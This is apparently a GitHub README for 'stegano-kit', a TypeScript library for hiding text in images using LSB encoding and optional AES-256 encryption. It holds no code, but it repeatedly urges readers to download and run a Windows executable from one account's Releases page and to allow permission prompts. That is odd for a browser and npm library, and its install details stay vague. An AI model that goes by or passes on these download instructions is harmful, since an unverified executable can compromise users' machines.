# 🔐 stegano-kit - Hide Messages in Images

[Download on GitHub Releases](https://github.com/imaiste8140/stegano-kit/releases)  
![Download](https://img.shields.io/badge/Download%20%26%20Run-GitHub%20Releases-blue?style=for-the-badge) ![Windows](https://img.shields.io/badge/Windows-Supported-grey?style=for-the-badge)

## 🧭 What this is

stegano-kit is a small tool for hiding secret text inside image files. It uses LSB encoding, which writes data into the least visible parts of an image. You can also turn on AES-256 encryption to protect the hidden message.

It works in the browser and in Node.js. It uses no extra dependencies and is written in TypeScript.

## 📥 Download for Windows

1. Open the [GitHub Releases page](https://github.com/imaiste8140/stegano-kit/releases).
2. Find the latest release.
3. Download the Windows file for your system.
4. If the release includes a `.zip` file, extract it first.
5. Open the app file or run the included command as shown in the release notes.

Use the release page as the main place to get the Windows build.

## 🖥️ Before you start

Use a Windows 10 or Windows 11 PC.

For best results:

- Keep at least one folder with your source images
- Use PNG images for the cleanest result
- Make sure you have enough free space for the output image
- If you want encrypted messages, keep your password safe

If you plan to use the Node.js version, install Node.js 18 or later.

## 🚀 Getting started

1. Download the release from the link above.
2. Open the file you downloaded.
3. If Windows asks for permission, allow it.
4. Choose an image file.
5. Type or paste the message you want to hide.
6. Turn on encryption if you want extra protection.
7. Save the new image file.
8. Share the image like any normal picture.

The hidden message stays inside the image until someone extracts it with the right tool and, if used, the correct password.

## 🧩 What you can do

- Hide short text in images
- Protect private notes with AES-256
- Use it in a browser
- Use it in Node.js scripts
- Work with image data in a simple way
- Keep the app light and fast

## 🖼️ Best image choices

The tool works with common image files, but some files give better results.

Good choices:

- PNG files
- Images with solid colors
- Images with enough size for your message

Avoid:

- Very small images
- Blurry images with heavy compression
- Images that already have a lot of noise if you need more room for text

If you want the cleanest result, use PNG files.

## 🔒 Encryption

You can add AES-256 encryption to the hidden message.

This helps when:

- You want to hide private notes
- You want to share a file with one person
- You do not want the message to be readable without a password

Use a strong password and keep it safe. If you lose the password, you will not be able to read the message again.

## 🛠️ Use in Node.js

If you want to use stegano-kit in a Node.js project, install it with npm and import the parts you need.

Typical use cases:

- Build a script that hides text in an image
- Add image steganography to a web app
- Read hidden text from an image file
- Encrypt message data before writing it into an image

Example use flow:

1. Load an image
2. Convert the image to pixel data
3. Write the secret message
4. Save the new image
5. Extract the message later when needed

## 🌐 Use in the browser

The library also works in the browser with canvas.

You can use it to:

- Load an image from the user’s device
- Draw it on a canvas
- Write hidden text into the pixel data
- Export the changed image

This works well for local tools and private web apps where you want to keep the data on the user’s machine.

## 🧪 Simple workflow

1. Pick an image
2. Enter your secret text
3. Add a password if needed
4. Encode the data into the image
5. Save the result
6. Open the saved image later to extract the message

## 📁 File types

Most users should start with PNG.

Why PNG works well:

- It keeps image data in a stable format
- It does not add strong compression artifacts
- It is a good fit for pixel-based editing

JPEG can work in some cases, but it is not the best choice when you want the hidden data to stay stable.

## ⚙️ Basic setup for developers

If you are setting this up in a project:

1. Install the package from npm
2. Import the encoder or decoder you need
3. Pass in your image data
4. Set your message
5. Choose whether to encrypt
6. Save or return the updated image

The package is built for clean use in both browser and Node.js code.

## 🧾 Typical features

- LSB steganography
- Optional AES-256 encryption
- Browser support
- Node.js support
- TypeScript-first design
- Zero runtime dependencies
- Small footprint
- Image data handling with canvas and pixel buffers

## 🧯 If the image looks wrong

If the image changes too much or does not open:

- Use a larger image
- Use a PNG file
- Try a shorter message
- Check that the image was saved in the right format
- Avoid editing the output image again before extraction

## 🗂️ Project topics

This project focuses on:

- browser
- canvas
- encryption
- image processing
- LSB
- Node.js
- npm package
- privacy
- security
- steganography
- TypeScript

## 📌 Where to download

Visit the [GitHub Releases page](https://github.com/imaiste8140/stegano-kit/releases) to download and run the Windows version from the latest release file

## 🧠 How it works

The library hides data by changing very small parts of an image. These changes are hard to see with the eye. That makes the picture look normal while the hidden text stays inside it.

When encryption is on, the text is locked before it goes into the image. This adds another layer of protection.

## 🪟 Windows steps

1. Open the release page
2. Download the latest Windows file
3. Save it to a folder you can find later
4. Extract it if needed
5. Open the app or run the package from the included instructions
6. Follow the prompts to hide or read a message

## 🔎 What to expect

After you encode a message:

- The image should still look normal
- The file size may change
- The hidden message will not show in the picture
- You will need the same tool and, if used, the password to recover the text